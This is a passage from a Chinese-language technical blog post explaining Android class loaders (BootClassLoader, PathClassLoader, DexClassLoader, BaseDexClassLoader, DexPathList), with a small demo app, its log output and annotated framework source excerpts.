class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.classloaderdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;ClassLoaderDemo&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 获取当前应用的类加载器（PathClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">pathClassLoader</span> <span class="operator">=</span> getClassLoader();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;PathClassLoader: &quot;</span> + pathClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取 BootClassLoader（引导类加载器）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootClassLoader</span> <span class="operator">=</span> pathClassLoader.getParent();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;BootClassLoader: &quot;</span> + bootClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 获取外部 Dex（动态加载）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dexPath</span> <span class="operator">=</span> <span class="string">&quot;/sdcard/external.dex&quot;</span>; <span class="comment">// 需要手动放置一个 dex 文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">optimizedDir</span> <span class="operator">=</span> getDir(<span class="string">&quot;dex&quot;</span>, MODE_PRIVATE);</span><br><span class="line">        <span class="type">DexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexPath,</span><br><span class="line">                optimizedDir.getAbsolutePath(),</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                pathClassLoader);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;DexClassLoader: &quot;</span> + dexClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 打印类加载器的层级关系</span></span><br><span class="line">        printClassLoaderHierarchy(dexClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printClassLoaderHierarchy</span><span class="params">(ClassLoader classLoader)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;ClassLoader: &quot;</span> + classLoader);</span><br><span class="line">            classLoader = classLoader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Reached BootClassLoader (null)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>日志输出如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PathClassLoader: dalvik.system.PathClassLoader[DexPathList[[zip file &quot;/data/app/\~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/base.apk&quot;],nativeLibraryDirectories=[/data/app/\~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/lib/arm64, /system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">BootClassLoader: java.lang.BootClassLoader@31eea01</span><br><span class="line">ClassLoader referenced unknown path: /sdcard/external.dex</span><br><span class="line">DexClassLoader: dalvik.system.DexClassLoader[DexPathList[[],nativeLibraryDirectories=[/system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">ClassLoader: dalvik.system.DexClassLoader[DexPathList[[],nativeLibraryDirectories=[/system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">ClassLoader: dalvik.system.PathClassLoader[DexPathList[[zip file &quot;/data/app/\~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/base.apk&quot;],nativeLibraryDirectories=[/data/app/~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/lib/arm64, /system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">ClassLoader: java.lang.BootClassLoader@31eea01</span><br><span class="line">Reached BootClassLoader (null)</span><br></pre></td></tr></table></figure><h2 id="BootClassLoader"><a href="#BootClassLoader" class="headerlink" title="BootClassLoader"></a>BootClassLoader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BootClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.classForName(name, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// .....</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; loadClass(String className, <span class="type">boolean</span> resolve)</span><br><span class="line">           <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = findLoadedClass(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = findClass(className);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>BootClassLoader重写了findClass和loadClass两个方法</p><p>当一个类不存在时会调用<code>Class.classForName</code>进行类的加载, 与加载基本类时的<code>Class.forName()</code>不同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ublic <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable,</span><br><span class="line">                              GenericDeclaration,</span><br><span class="line">                              Type,</span><br><span class="line">                              AnnotatedElement &#123;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className)</span><br><span class="line">                <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">return</span> forName(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="type">boolean</span> initialize,</span><br><span class="line">                                   ClassLoader loader)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">            loader = BootClassLoader.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = classForName(name, initialize, loader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">            <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> LinkageError) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (LinkageError) cause;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本地方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; classForName(String className, <span class="type">boolean</span> shouldInitialize,</span><br><span class="line">            ClassLoader classLoader) <span class="keyword">throws</span> ClassNotFoundException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现forName实际上调用的还是classForName</p><p>ZygoteInit.preloadClasses()中调用Class.forName()，实际是指定BootClassLoader为类加载器，且只需要在预加载的时候进行类初始化，只需要一次<br>总之，通过 Class.forName() 或者 Class.classForName() 可以且仅可以直接加载基本类，一旦基本类预加载后，对于应用程序而言，我们虽然不能直接访问BootClassLoader，但可以通过Class.forName/Class.classForName加载</p><h3 id="class文件加载"><a href="#class文件加载" class="headerlink" title="class文件加载"></a>class文件加载</h3><p>类加载时机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.隐式加载:</span><br><span class="line">(1)创建类的实例,也就是new一个对象</span><br><span class="line">(2)访问某个类或接口的静态变量,或者对该静态变量赋值</span><br><span class="line">(3)调用类的静态方法</span><br><span class="line">(4)反射Class.forName(&quot;android.app.ActivityThread&quot;)</span><br><span class="line">(5)初始化一个类的子类(会首先初始化子类的父类)</span><br><span class="line">2.显示加载：</span><br><span class="line">(1)使用LoadClass()加载</span><br><span class="line">(2)使用forName()加载</span><br></pre></td></tr></table></figure><p>Class.forName 和 ClassLoader.loadClass加载有何不同：<br>（1）ClassLoader.loadClass也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作)<br>（2）Class.forName这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作</p><h2 id="PathClassLoader"><a href="#PathClassLoader" class="headerlink" title="PathClassLoader"></a>PathClassLoader</h2><p>PathClassLoader 是作为应用程序的系统类加载器，也是在 Zygote 进程启动的时候初始化的</p><p>基本流程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZygoteInit.main() -&gt; </span><br><span class="line">ZygoteInit.forkSystemServer() -&gt; </span><br><span class="line">ZygoteInit.handleSystemServerProcess() -&gt; </span><br><span class="line">ZygoteInit.createPathClassLoader()</span><br></pre></td></tr></table></figure><p>在预加载基本类之后执行，所以每一个 APP 进程从 Zygote 中 fork 出来之后都自动携带了一个 PathClassLoader，它通常用于加载 apk 里面的 .dex 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PathClassLoader</span> <span class="keyword">extends</span> <span class="title class_">BaseDexClassLoader</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PathClassLoader</span><span class="params">(String dexPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(dexPath, <span class="literal">null</span>, <span class="literal">null</span>, parent);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PathClassLoader</span><span class="params">(String dexPath, String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(dexPath, <span class="literal">null</span>, librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DexClassLoader"><a href="#DexClassLoader" class="headerlink" title="DexClassLoader"></a>DexClassLoader</h2><p>可以从包含classes.dex的jar或者apk中，加载类的类加载器, 可用于执行动态加载, 但必须是app私有可写目录来缓存odex文件. 能够加载系统没有安装的apk或者jar文件， 因此很多热修复和插件化方案都是采用DexClassLoader</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> </span><br><span class="line"><span class="title class_">DexClassLoader</span> <span class="keyword">extends</span> <span class="title class_">BaseDexClassLoader</span> &#123;    </span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">DexClassLoader</span><span class="params">(String dexPath, String optimizedDirectory,</span></span><br><span class="line"><span class="params">            String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(dexPath, <span class="keyword">new</span> <span class="title class_">File</span>(optimizedDirectory), librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与PathClassLoader相比, DexClassLoader提供了optimizedDirectory，而PathClassLoader则没有</p><p>optimizedDirectory正是用来存放odex文件的地方，所以可以利用DexClassLoader实现动态加载</p><h2 id="BaseDexClassLoader"><a href="#BaseDexClassLoader" class="headerlink" title="BaseDexClassLoader"></a>BaseDexClassLoader</h2><p>BaseDexClassLoader是PathClassLoader和DexClassLoader共同的父类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseDexClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DexPathList pathList;</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory,String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(dexPath, optimizedDirectory, librarySearchPath, parent, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory,String librarySearchPath, ClassLoader parent, <span class="type">boolean</span> isTrusted)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="built_in">this</span>.pathList = <span class="keyword">new</span> <span class="title class_">DexPathList</span>(<span class="built_in">this</span>, dexPath, librarySearchPath, <span class="literal">null</span>, isTrusted);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (reporter != <span class="literal">null</span>) &#123;</span><br><span class="line">            reportClassLoaderChain();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        List&lt;Throwable&gt; suppressedExceptions = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Throwable&gt;();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> pathList.findClass(name, suppressedExceptions);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ClassNotFoundException</span> <span class="variable">cnfe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(</span><br><span class="line">                    <span class="string">&quot;Didn&#x27;t find class \&quot;&quot;</span> + name + <span class="string">&quot;\&quot; on path: &quot;</span> + pathList);</span><br><span class="line">            <span class="keyword">for</span> (Throwable t : suppressedExceptions) &#123;</span><br><span class="line">                cnfe.addSuppressed(t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> cnfe;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BaseDexClassLoader继承于ClassLoader, 额外增加了pathList字段, 并且重写了类加载函数findClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dexPath: 包含目标类或资源的apk/jar列表;当有多个路径则采用:分割;</span><br><span class="line">optimizedDirectory: 优化后dex文件存在的目录, 可以为<span class="literal">null</span>;</span><br><span class="line">libraryPath: <span class="keyword">native</span>库所在路径列表;当有多个路径则采用:分割;</span><br><span class="line">ClassLoader:父类的类加载器</span><br></pre></td></tr></table></figure><p>并且其findClass其实是委托给了pathList的.findClass函数</p><h3 id="PathList"><a href="#PathList" class="headerlink" title="PathList"></a>PathList</h3><p>该类主要用来查找Dex、SO库的路径，并这些路径整体呈一个数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">DexPathList</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Element[] dexElements;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; nativeLibraryDirectories;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; systemNativeLibraryDirectories;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">DexPathList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DexPathList</span><span class="params">(ClassLoader definingContext, String dexPath,String libraryPath, File optimizedDirectory)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">this</span>.definingContext = definingContext;</span><br><span class="line">        ArrayList&lt;IOException&gt; suppressedExceptions = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;IOException&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//记录所有的dexFile文件</span></span><br><span class="line">        <span class="built_in">this</span>.dexElements = makePathElements(splitDexPath(dexPath), optimizedDirectory, suppressedExceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//app目录的native库</span></span><br><span class="line">        <span class="built_in">this</span>.nativeLibraryDirectories = splitPaths(libraryPath, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//系统目录的native库</span></span><br><span class="line">        <span class="built_in">this</span>.systemNativeLibraryDirectories = splitPaths(System.getProperty(<span class="string">&quot;java.library.path&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">        List&lt;File&gt; allNativeLibraryDirectories = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(nativeLibraryDirectories);</span><br><span class="line">        allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class="line">        <span class="comment">//记录所有的Native动态库</span></span><br><span class="line">        <span class="built_in">this</span>.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories, <span class="literal">null</span>, suppressedExceptions);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DexPathList初始化过程，主要收集以下两个变量信息：<br>（1）dexElements: 根据多路径的分隔符<code>;</code>将dexPath转换成File列表，记录所有的dexFile<br>（2）nativeLibraryPathElements: 记录所有的Native动态库, 包括app目录的native库和系统目录的native库</p><p><strong>makePathElements：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Element[] makePathElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class="line">        List&lt;IOException&gt; suppressedExceptions) &#123;</span><br><span class="line">    <span class="keyword">return</span> makeDexElements(files, optimizedDirectory, suppressedExceptions, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>makeDexElements：</strong></p><p>makeDexElements方法的作用是获取一个包含dex文件的元素集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class="line">        List&lt;IOException&gt; suppressedExceptions, ClassLoader loader, <span class="type">boolean</span> isTrusted) &#123;</span><br><span class="line">  Element[] elements = <span class="keyword">new</span> <span class="title class_">Element</span>[files.size()];  <span class="comment">//获取文件个数</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">elementsPos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">      <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">          elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(file);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> file.getName();</span><br><span class="line">          <span class="type">DexFile</span> <span class="variable">dex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">          <span class="comment">//匹配以.dex为后缀的文件</span></span><br><span class="line">          <span class="keyword">if</span> (name.endsWith(DEX_SUFFIX)) &#123;</span><br><span class="line">              dex = loadDexFile(file, optimizedDirectory, loader, elements);</span><br><span class="line">              <span class="keyword">if</span> (dex != <span class="literal">null</span>) &#123;</span><br><span class="line">                  elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(dex, <span class="literal">null</span>);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              dex = loadDexFile(file, optimizedDirectory, loader, elements);              </span><br><span class="line">              <span class="keyword">if</span> (dex == <span class="literal">null</span>) &#123;</span><br><span class="line">                  elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(file);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(dex, file);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (dex != <span class="literal">null</span> &amp;&amp; isTrusted) &#123;</span><br><span class="line">            dex.setTrusted();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          System.logW(<span class="string">&quot;ClassLoader referenced unknown path: &quot;</span> + file);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (elementsPos != elements.length) &#123;</span><br><span class="line">      elements = Arrays.copyOf(elements, elementsPos);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elements;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法的主要功能是创建Element数组</p><p><strong>loadDexFile：</strong></p><p>加载DexFile文件，而且会把优化后的dex文件缓存到对应目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> DexFile <span class="title function_">loadDexFile</span><span class="params">(File file, File optimizedDirectory, ClassLoader loader,</span></span><br><span class="line"><span class="params">                                   Element[] elements)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (optimizedDirectory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DexFile</span>(file, loader, elements);  <span class="comment">//创建DexFile对象</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">optimizedPath</span> <span class="operator">=</span> optimizedPathFor(file, optimizedDirectory);</span><br><span class="line">        <span class="keyword">return</span> DexFile.loadDex(file.getPath(), optimizedPath, <span class="number">0</span>, loader, elements);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DexFile：</strong></p><p>用来描述Dex文件，Dex的加载以及Class的查找都是由该类调用它的native方法完成的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DexFile(File file, ClassLoader loader, DexPathList.Element[] elements)</span><br><span class="line">        <span class="keyword">throws</span> 